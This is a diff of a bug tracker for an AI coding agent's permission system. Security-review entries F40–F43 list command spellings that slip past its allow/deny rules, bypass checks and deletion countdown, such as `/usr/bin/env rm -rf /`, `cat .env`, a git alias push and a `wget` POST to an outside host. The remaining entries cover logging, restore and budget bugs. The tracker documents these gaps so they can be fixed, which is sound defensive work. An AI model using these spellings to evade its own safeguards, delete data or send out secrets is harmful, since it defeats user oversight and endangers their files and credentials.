@@ -14,21 +14,21 @@ When fixed, move the entry to "Fixed" and add `- **Fixed:** #<PR>`.
 
 ## Open
 
-### F40 (M2-16 security review): a wrapper written as a path, or with flags the parser doesn't know, hides the inner command from every check
-- **Severity:** blocker (pre-existing) · `src/policy/rules/shell.ts:179` (`WRAPPERS.get(argv[0])` matches the text, not the program's basename), `:188-191`, `:122` (`env -S`), `src/policy/decide/decide.ts:193-204` and `targets.ts:39` (`find -exec` is never looked into)
-- Confirmed by `test/adversarial/guarantees.test.ts` (`test.failing`): with a tool-wide `Bash` allow rule `/usr/bin/env rm -rf /` and `/usr/bin/env cat .env` are allowed while `env rm -rf /` and `cat .env` ask; a deny rule `Bash(rm *)` lets `/bin/rm -rf x` through; `/usr/bin/env git push origin main` is allowed in tainted `bypassPermissions`. Reviewer's list of further spellings: `/usr/bin/timeout 9 git push`, `sudo -iu me git push`, `env -S 'git push origin main'`, `find . -maxdepth 0 -exec git push \;`; under sandbox auto-allow (headless never sets `State.sandboxAutoAllow`, so latent until it is wired) `/usr/bin/env rm -rf <cwd>`. Class: every check that recognises a command by `argv[0]` (strippedArgvs, shellVariants, criticalRemoval, shellTargets, oneRemote, selfControl) without reducing wrappers to their basename and parsing wrapper flags. Fix once at the unwrapping step and feed all checks from it.
+### F40 (M2-16 security review): a wrapper written as a path hides the inner command from every check
+- **Severity:** blocker · `src/policy/rules/shell.ts:179,188-191,122`, `decide.ts:193-204`, `targets.ts:39`
+- `test.failing` in `test/adversarial/guarantees.test.ts`: with tool-wide `Bash` allow `/usr/bin/env rm -rf /` and `/usr/bin/env cat .env` are allowed (`env …` asks); deny `Bash(rm *)` misses `/bin/rm`; tainted bypass allows `/usr/bin/env git push`, `sudo -iu me git push`, `env -S '…'`, `find -exec git push`. Reduce wrappers to the basename and parse their flags once, for all checks.
 
-### F41 (M2-16 security review): an alias on the git command line hides `git push` from the remote-action check
-- **Severity:** major (pre-existing) · `src/policy/decide/remote.ts:22-30` (`gitArgs` reads the alias name as the subcommand)
-- Confirmed (`test.failing`): `git -c alias.p=push p origin main` is allowed in tainted `bypassPermissions`; the reviewer also saw it allowed under `Bash(git *)` and sandbox auto-allow where plain `git push` asks. Also allowed while tainted in bypass (minor, same list gap): `git send-pack origin main`, `gh release upload v1 secret.txt`, `wget --method=POST --body-data=x http://e.com`, `npx npm publish`.
+### F41 (M2-16 security review): `git -c alias.p=push p` hides a push from the remote-action check
+- **Severity:** major · `src/policy/decide/remote.ts:22-30`
+- `test.failing`: allowed in tainted bypass. Same gap (minor): `git send-pack`, `gh release upload`, `wget --method=POST`, `npx npm publish`.
 
-### F42 (M2-16 security review): other spellings of the home or working directory aren't critical, so bypass mode removes them without the countdown
-- **Severity:** major (pre-existing) · `src/policy/decide/critical.ts:61-72` (only `~`, `~/`, `$HOME`, `${HOME}` are expanded)
-- Confirmed (`test.failing`): in `bypassPermissions` `rm -rf ~marwan`, `rm -rf ~+` and `rm -rf "$PWD"` are allowed; `rm -rf ~` asks with the countdown. Treat `~user`, `~+`, `~-`, `$PWD`, `$OLDPWD` as critical spellings.
+### F42 (M2-16 security review): `~user`, `~+`, `$PWD` aren't critical spellings
+- **Severity:** major · `src/policy/decide/critical.ts:61-72`
+- `test.failing`: in `bypassPermissions` `rm -rf ~+` and `rm -rf "$PWD"` run with no countdown (`rm -rf ~` asks).
 
-### F43 (M2-16 security review): values from `.env` files are redacted only when the variable name looks secret (reviewer's reproduction; not rechecked)
-- **Severity:** major (pre-existing) · `src/policy/redaction/secrets.ts:60`, `src/cli/headless-run.ts:446` (scans only `projectRoot`, not additional working directories)
-- `.env` with `DB_PASS=hunter2hunter2xyz` and `STRIPE_SK=rk_live_51Habcdefghij`: `createDotEnvSecrets(...).current()` holds only `SESSION_SECRET`-like names, so `grep -r . .` (a read-only command, allowed unprompted) prints the others. Permissions §4.7 says the values of `.env*` files join the redaction set; apply the name filter only to the process environment.
+### F43 (M2-16 security review): `.env` values are redacted only when the variable name looks secret (not rechecked)
+- **Severity:** major · `src/policy/redaction/secrets.ts:60`, `headless-run.ts:446` (project root only)
+- `DB_PASS=…`, `STRIPE_SK=…` stay visible to `grep -r . .`; §4.7 puts all `.env*` values in the set. Apply the name filter to the process environment only.
 
 ### F44 (M2-16 security review): an invisible character inside a secret stops its redaction
 - **Severity:** minor · `src/agent/loop.ts:370-372` (`stripHidden` runs before `redactText`), `src/policy/redaction/redact.ts:29` (folds only U+200B/C/D, U+FEFF)
@@ -50,33 +50,33 @@ When fixed, move the entry to "Fixed" and add `- **Fixed:** #<PR>`.
 - **Severity:** minor · `src/policy/decide/targets.ts:6-40`
 - With a tool-wide `Bash` allow: `tar -xf x.tar -C .git/hooks`, `unzip x.zip -d .git`, `rsync a.ts .git/hooks/pre-commit`, `patch .git/config p.diff`, `perl -pi -e s/a/b/ .git/config` are allowed; `cp`, `sed -i`, `dd of=`, `tee` and redirects ask. Bash has no equivalent of the PowerShell archive-extraction rule.
 
-### F36 (M2-16 spec review): a log whose last line is complete but has no final newline gets the next event glued onto it
-- **Severity:** major (pre-existing) · `src/store/event-log/reader.ts:128`, `src/store/event-log/writer.ts:127`
-- Reviewer's reproduction: write a session, close it, strip the final `\n`, reopen the writer, append a `user.message`: the next read says `line 1: the line is not valid JSON` and returns 0 events. The reader accepts a last line that parses but leaves `tornLine` unset, and the writer appends `\n` only when `tornLine` is set; a crash can cut a write just before its newline (F20 covered a half line). Have the reader report "no trailing newline" separately and the writer add `\n` (without the crash-repair marker) whenever the file doesn't end in one.
+### F36 (M2-16 spec review): a last log line without its final newline gets the next event glued on
+- **Severity:** major · `src/store/event-log/reader.ts:128`, `writer.ts:127`
+- Strip the final `\n` of a closed log, reopen, append: next read is read-only, 0 events. Reader must flag "no trailing newline"; the writer then adds `\n` (no repair marker).
 
-### F37 (M2-16 spec review): a blob-mode restore writes through a parent directory that became a symlink
-- **Severity:** major (pre-existing) · `src/store/snapshots/checkpoints.ts:255-284`
-- With checkpoints disabled (blob mechanism): record a write of `w/sub/a.txt`, replace `w/sub` with a link to `../outside`, `restore("c1", "skip")` reports `written: 1` and `outside/a.txt` holds the old text. Checkpoints "Restore never writes through links" holds for the leaf (`lstat`) only; the git path checks every component through `pathBlock`. Run the same per-component check in the blob branch, for writes and deletes.
+### F37 (M2-16 spec review): blob-mode restore writes through a parent directory turned symlink
+- **Severity:** major · `src/store/snapshots/checkpoints.ts:255-284`
+- Replace `w/sub` by a link to `../outside` after recording `w/sub/a.txt`: `restore` overwrites `outside/a.txt`. Only the leaf is `lstat`ed; run the git path's `pathBlock` on every component for writes and deletes.
 
-### F38 (M2-16 spec review): a workspace opened through a symlink reports every Dovet-written file as a user conflict
-- **Severity:** major (pre-existing) · `src/store/snapshots/checkpoints.ts:179,187`
-- Git repo at `real/`, workspace opened as `via -> real` (macOS `/tmp` and `/var`, Windows `subst`): candidates are joined onto the git root's real path, while `file.change` events carry the workspace paths, so the `left` lookup never matches; `conflicts()` returns the file and "Skip these" restores nothing. Canonicalise both sides (or map git-root paths back to workspace paths) before comparing.
+### F38 (M2-16 spec review): a workspace opened through a symlink makes every Dovet write a "conflict"
+- **Severity:** major · `src/store/snapshots/checkpoints.ts:179,187`
+- Candidates join onto git's real root while `file.change` has workspace paths, so the lookup never matches (macOS `/tmp`, Windows `subst`). Canonicalise both sides.
 
 ### F39 (M2-16 spec review): the compaction facts' command output tail can start with a lone surrogate
 - **Severity:** minor (pre-existing) · `src/agent/compaction/facts.ts:68`
 - `r.output.trim().slice(-600)` on 400 emoji followed by `b` starts with U+DE00 (`isWellFormed()` false) and goes into the request sent to the provider. Use `tailOf(output, 600)` like the other cuts.
 
 ### F34 (M2-16 spec review): compaction requests never reach the daily ledger
-- **Severity:** major (pre-existing) · `src/cli/headless-run.ts:1141-1162` (`sendSummary`; `ledger.reserve/commit/release` are only on the main-request path, lines 1374, 1393, 1639)
-- A summary request (often the session's largest) calls `meter.record("compaction", …)` and adds to `guards.cost`, but writes no `reserve`/`commit` line: other sessions' day totals and this session's next daily check leave it out, so the hard daily cap (receipts-budgets "Behavior" 5, AC-RCPT-10 "counted toward budgets") is undercounted. Reserve before the call with the same estimate path as the main request and commit or release after; test: a day limit the summary would cross refuses it, and a second session sees its cost.
+- **Severity:** major · `src/cli/headless-run.ts:1141-1162` (`sendSummary`)
+- It calls `meter.record` but no `ledger.reserve/commit`, so the hard daily cap (AC-RCPT-10) undercounts. Reserve and commit like the main request (:1374-1639); also run `meter.check` before `compact()` (F35, minor, :1165). Test: a summary that crosses the day limit is refused.
 
 ### F35 (M2-16 spec review): compaction requests get no pre-flight budget check
 - **Severity:** minor (pre-existing) · `src/cli/headless-run.ts:1165` (`compactEpoch`, called from :1288 and :1815; `meter.check` runs only at :1367)
 - A session at 99% of `--budget` still sends and pays a full summary request before the next check refuses. Estimate the summary request and run `meter.check` plus the ledger reserve before `compact()`; on refusal stop with the budget message. Fix together with F34.
 
 ### F29 (M2-16 kill -9 probe): a string over 256 KB in an event crashes the headless run
-- **Severity:** major (pre-existing) · `src/cli/headless-run.ts:583` (`events.push(writer.append(...))`), `src/agent/transcript/build.ts:133`
-- `append` returns the envelope with large strings already replaced by `{ $blob, bytes }`, and the run keeps that envelope in its in-memory events, so building the transcript parses a blob reference where text is expected: `runHeadless` with a 300 KB prompt, or a model `Write` call with 300 KB of content, throws `ZodError: path ["text"] / ["parts",0,"inputJson"]: expected string, received object`. Event-log "Writer rules" 5 says readers resolve blobs transparently, and resume does, but the live path doesn't. Fix at the cause: `append` returns the inflated data (or the run reads its events back through the reader's inflate), with a test for a 300 KB user message, tool input and tool output. Reproduce: `runIn(root, { adapter: scripted([[]]), prompt: "y".repeat(300_000) })` from `test/adversarial/harness.ts`.
+- **Severity:** major · `src/cli/headless-run.ts:583`, `src/agent/transcript/build.ts:133`
+- `writer.append` returns the blobbed envelope and the run keeps it, so a 300 KB prompt or Write content throws `ZodError … expected string, received object`. Return inflated data; test a 300 KB message, tool input and output (`runIn` in `test/adversarial/harness.ts`).
 
 ### F30 (M2-16 kill -9 probe): a model response over 1 MB of strings that are each under 256 KB throws and ends the run
 - **Severity:** minor (pre-existing) · `src/store/event-log/writer.ts:202`
